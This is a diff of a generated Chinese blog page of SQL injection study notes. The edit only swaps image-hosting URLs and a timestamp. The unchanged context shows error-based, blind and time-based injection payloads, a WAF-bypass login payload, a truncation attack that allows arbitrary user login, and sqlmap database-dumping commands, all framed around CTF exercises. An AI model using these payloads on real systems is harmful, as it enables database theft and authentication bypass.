@@ -94,22 +94,22 @@
 
 因为很反感自己成为一名脚本小子，所以以前不管是是做题还是渗透都喜欢手工注入，然而sql注入语句都比较严谨，常常因为自己手残打错了一个符号导致浪费了大量的时间，所以在这里做一个笔记，方便自己也方便他人
 有回显位的SQL注入（回显位简单来说就是你select 1,2,3页面会出现1,2,3）此类注入最">
-<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/152111.PNG">
-<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/11.PNG">
-<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/121.PNG">
-<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/13.PNG">
-<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/14.PNG">
-<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/15.PNG">
-<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/17.PNG">
-<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/18.PNG">
-<meta property="og:updated_time" content="2017-07-27T03:05:34.000Z">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/152111.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/11.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/121.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/13.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/14.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/15.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/17.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/18.PNG">
+<meta property="og:updated_time" content="2018-11-15T04:55:15.957Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅谈sql注入学习笔记与sqlmap的使用">
 <meta name="twitter:description" content="参考自http://www.cnblogs.com/hongfei/p/3872156.html
 
 因为很反感自己成为一名脚本小子，所以以前不管是是做题还是渗透都喜欢手工注入，然而sql注入语句都比较严谨，常常因为自己手残打错了一个符号导致浪费了大量的时间，所以在这里做一个笔记，方便自己也方便他人
 有回显位的SQL注入（回显位简单来说就是你select 1,2,3页面会出现1,2,3）此类注入最">
-<meta name="twitter:image" content="http://olgkg6ct5.bkt.clouddn.com/152111.PNG">
+<meta name="twitter:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/152111.PNG">
 
 
 
@@ -460,7 +460,7 @@
 <h4 id="利用updatexml函数报错"><a href="#利用updatexml函数报错" class="headerlink" title="利用updatexml函数报错"></a>利用updatexml函数报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and 1=updatexml(1,concat(0x3a,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>)<span class="comment">--+</span></div></pre></td></tr></table></figure>
 <h4 id="利用name-const函数构造两个相同的列名报错"><a href="#利用name-const函数构造两个相同的列名报错" class="headerlink" title="利用name_const函数构造两个相同的列名报错"></a>利用name_const函数构造两个相同的列名报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and 1=(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>))<span class="keyword">as</span> b)<span class="comment">--+</span></div></pre></td></tr></table></figure>
 <h4 id="利用extractvalue报错注入"><a href="#利用extractvalue报错注入" class="headerlink" title="利用extractvalue报错注入"></a>利用extractvalue报错注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))</div></pre></td></tr></table></figure>
-<p><img src="http://olgkg6ct5.bkt.clouddn.com/152111.PNG" alt=""></p>
+<p><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/152111.PNG" alt=""></p>
 <h3 id="有显示但是无回显位的"><a href="#有显示但是无回显位的" class="headerlink" title="有显示但是无回显位的"></a>有显示但是无回显位的</h3><p>(就是查询正确和查询错误页面返回结果不一致的)<br>此类一般用盲注<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">50</span>)<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
 <h3 id="无显示无回显的"><a href="#无显示无回显的" class="headerlink" title="无显示无回显的"></a>无显示无回显的</h3><p>加一个if<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and If(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">50</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
 <h3 id="图片类型注入"><a href="#图片类型注入" class="headerlink" title="图片类型注入"></a>图片类型注入</h3><p><a href="http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df%27.jpg" target="_blank" rel="external">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df%27.jpg</a></p>
@@ -474,7 +474,7 @@
 <p>此类手工一般不显示，建议用py脚本跑</p>
 <h3 id="基于约束的SQL攻击"><a href="#基于约束的SQL攻击" class="headerlink" title="基于约束的SQL攻击"></a>基于约束的SQL攻击</h3><p>也就是二次注入的原理<br>因为sql的select是不忽视最大长度的限制的<br>而insert是有最大长度的限制的，超过长度限制就会发生截断。所以可以利用insert插入一个任意用户名加（N个空格，一般64个）然后用select选择出来，select默认是选择第一条数据，所以存在一个任意用户登录的漏洞</p>
 <h2 id="关于绕过WALF网上有很多，这里仅给出一个个人认为最通用的"><a href="#关于绕过WALF网上有很多，这里仅给出一个个人认为最通用的" class="headerlink" title="关于绕过WALF网上有很多，这里仅给出一个个人认为最通用的"></a>关于绕过WALF网上有很多，这里仅给出一个个人认为最通用的</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=admin'^(ascii(mid((passwd)from(1)))&gt;=10)^'1'='1</div></pre></td></tr></table></figure>
-<h2 id="可以绕过-union-select-and-or-空格-，balabalabalabala"><a href="#可以绕过-union-select-and-or-空格-，balabalabalabala" class="headerlink" title="可以绕过(,,union,select,and,or,空格,#，balabalabalabala)"></a>可以绕过(,,union,select,and,or,空格,#，balabalabalabala)</h2><h3 id="sqlmap使用详解"><a href="#sqlmap使用详解" class="headerlink" title="sqlmap使用详解"></a>sqlmap使用详解</h3><p>运用sqlmap在CTF比赛的时候可以节省大量的时间<br>下面以ISCC2017一道宽字节注入为例子（手工注入参照我博客的ISCC）<br>判断有无注入点<br><img src="http://olgkg6ct5.bkt.clouddn.com/11.PNG" alt=""><br>爆库名<br><img src="http://olgkg6ct5.bkt.clouddn.com/121.PNG" alt=""><br>爆表名<br><img src="http://olgkg6ct5.bkt.clouddn.com/13.PNG" alt=""><br><img src="http://olgkg6ct5.bkt.clouddn.com/14.PNG" alt=""><br>爆列(字段)名<br><img src="http://olgkg6ct5.bkt.clouddn.com/15.PNG" alt=""><br>爆字段内容<br><img src="http://olgkg6ct5.bkt.clouddn.com/17.PNG" alt=""><br>得到flag<br><img src="http://olgkg6ct5.bkt.clouddn.com/18.PNG" alt=""></p>
+<h2 id="可以绕过-union-select-and-or-空格-，balabalabalabala"><a href="#可以绕过-union-select-and-or-空格-，balabalabalabala" class="headerlink" title="可以绕过(,,union,select,and,or,空格,#，balabalabalabala)"></a>可以绕过(,,union,select,and,or,空格,#，balabalabalabala)</h2><h3 id="sqlmap使用详解"><a href="#sqlmap使用详解" class="headerlink" title="sqlmap使用详解"></a>sqlmap使用详解</h3><p>运用sqlmap在CTF比赛的时候可以节省大量的时间<br>下面以ISCC2017一道宽字节注入为例子（手工注入参照我博客的ISCC）<br>判断有无注入点<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/11.PNG" alt=""><br>爆库名<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/121.PNG" alt=""><br>爆表名<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/13.PNG" alt=""><br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/14.PNG" alt=""><br>爆列(字段)名<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/15.PNG" alt=""><br>爆字段内容<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/17.PNG" alt=""><br>得到flag<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/18.PNG" alt=""></p>
 <p>首先判断有无注入点<br>win<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot;</div></pre></td></tr></table></figure></p>
 <p>linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot;</div></pre></td></tr></table></figure></p>
 <p>暴库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; --dbs</div></pre></td></tr></table></figure></p>
